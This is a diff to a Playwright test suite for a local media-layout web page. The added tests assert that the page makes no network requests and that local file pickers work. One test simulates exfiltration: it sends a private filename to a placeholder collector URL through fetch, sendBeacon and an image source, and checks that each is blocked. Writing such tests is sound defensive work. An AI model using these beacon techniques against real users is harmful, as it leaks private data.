@@ -117,11 +117,20 @@ class ResizeBrowserTests(unittest.TestCase):
     def setUp(self):
         self.page = self._browser.new_page(viewport={"width": 1400, "height": 1200})
         self.errors = []
+        self.http_requests = []
         self.page.on("pageerror", lambda err: self.errors.append(str(err)))
+        self.page.on("request", self.record_request)
         self.page.goto(INDEX.resolve().as_uri())
 
+    def record_request(self, request):
+        url = request.url
+        if url.startswith(("http://", "https://", "ws://", "wss://")):
+            self.http_requests.append(url)
+
     def tearDown(self):
+        outbound = list(self.http_requests)
         self.page.close()
+        self.assertEqual(outbound, [])
         self.assertEqual(self.errors, [])
 
     def metrics(self, index=0):
@@ -161,6 +170,17 @@ class ResizeBrowserTests(unittest.TestCase):
 
     def assertClose(self, actual, expected, delta=1.5):
         self.assertAlmostEqual(actual, expected, delta=delta)
+
+    def wait_until(self, expression, timeout_ms=5000):
+        # page.wait_for_function evaluates in the page and is blocked by the
+        # page CSP. Poll from Playwright's isolated world instead.
+        elapsed = 0
+        while elapsed <= timeout_ms:
+            if self.page.evaluate(f"() => Boolean({expression})"):
+                return
+            self.page.wait_for_timeout(50)
+            elapsed += 50
+        self.fail("timed out waiting for " + expression)
 
     def test_corner_handles_are_visible_on_the_corners(self):
         self.page.evaluate("addText()")
@@ -372,7 +392,7 @@ class ResizeBrowserTests(unittest.TestCase):
         self.assertEqual(video["handles"], 4)
         self.assertTrue(self.page.evaluate("() => document.querySelector('video').controls"))
         self.page.evaluate("() => document.querySelector('video').play()")
-        self.page.wait_for_function("document.querySelector('video').currentTime > 0")
+        self.wait_until("document.querySelector('video').currentTime > 0")
 
         self.page.evaluate("clearScene()")
         self.page.locator("#fileInput").set_input_files(str(self.wav))
@@ -381,7 +401,7 @@ class ResizeBrowserTests(unittest.TestCase):
         self.assertEqual(audio["kind"], "audio")
         self.assertEqual(audio["handles"], 4)
         self.page.evaluate("() => document.querySelector('audio').play()")
-        self.page.wait_for_function("document.querySelector('audio').currentTime > 0")
+        self.wait_until("document.querySelector('audio').currentTime > 0")
 
         self.page.evaluate("clearScene()")
         self.page.locator("#fileInput").set_input_files(str(self.text))
@@ -480,6 +500,69 @@ class ResizeBrowserTests(unittest.TestCase):
         self.assertEqual(nw["height"], 120)
         self.assertEqual(nw["left"] + nw["width"], 100 + 200)
         self.assertEqual(nw["top"] + nw["height"], 80 + 100)
+
+    def test_local_playback_and_filename_are_not_requested(self):
+        self.page.locator("#fileInput").set_input_files(str(self.mp4))
+        self.page.wait_for_selector(".media-element video")
+        self.page.evaluate("() => document.querySelector('video').play()")
+        self.wait_until("document.querySelector('video').currentTime > 0")
+        secret = "private-clip-name.mp4"
+        attempt = self.page.evaluate(
+            """async (secret) => {
+                const url = 'https://example.invalid/collect?file=' + encodeURIComponent(secret);
+                const before = window.__localOnly.blocked;
+                let fetchRejected = false;
+                try { await fetch(url, { method: 'POST', body: secret }); }
+                catch (e) { fetchRejected = true; }
+                let beacon = 'threw';
+                try { beacon = navigator.sendBeacon(url, secret) ? 'sent' : 'false'; }
+                catch (e) { beacon = 'threw'; }
+                const img = document.createElement('img');
+                img.src = url;
+                const blobUrl = URL.createObjectURL(new Blob(['hello'], { type: 'text/plain' }));
+                const local = document.createElement('img');
+                local.src = blobUrl;
+                return {
+                    fetchRejected: fetchRejected,
+                    beacon: beacon,
+                    remoteSrc: img.getAttribute('src'),
+                    localAssigned: local.src.indexOf('blob:') === 0,
+                    blocked: window.__localOnly.blocked - before
+                };
+            }""",
+            secret,
+        )
+        self.assertTrue(attempt["fetchRejected"])
+        self.assertIn(attempt["beacon"], ("false", "threw"))
+        self.assertIn(attempt["remoteSrc"], (None, ""))
+        self.assertTrue(attempt["localAssigned"])
+        self.assertGreaterEqual(attempt["blocked"], 2)
+        self.assertFalse(any(secret in url for url in self.http_requests))
+        self.assertEqual(self.http_requests, [])
+
+    def test_add_video_and_add_image_use_the_local_picker(self):
+        with self.page.expect_file_chooser() as video_chooser:
+            self.page.get_by_role("button", name="Add Video").click()
+        self.assertEqual(
+            self.page.locator("#fileInput").get_attribute("data-picker-accept"),
+            "video/*",
+        )
+        video_chooser.value.set_files(str(self.mp4))
+        self.page.wait_for_selector(".media-element video")
+        self.page.evaluate("clearScene()")
+        with self.page.expect_file_chooser() as image_chooser:
+            self.page.get_by_role("button", name="Add Image").click()
+        self.assertEqual(
+            self.page.locator("#fileInput").get_attribute("data-picker-accept"),
+            "image/*",
+        )
+        image_chooser.value.set_files(str(self.png))
+        self.page.wait_for_selector(".media-element img")
+        self.assertEqual(
+            self.page.evaluate("() => document.querySelector('img').naturalWidth"),
+            120,
+        )
+        self.assertEqual(self.http_requests, [])
 
 
 if __name__ == "__main__":
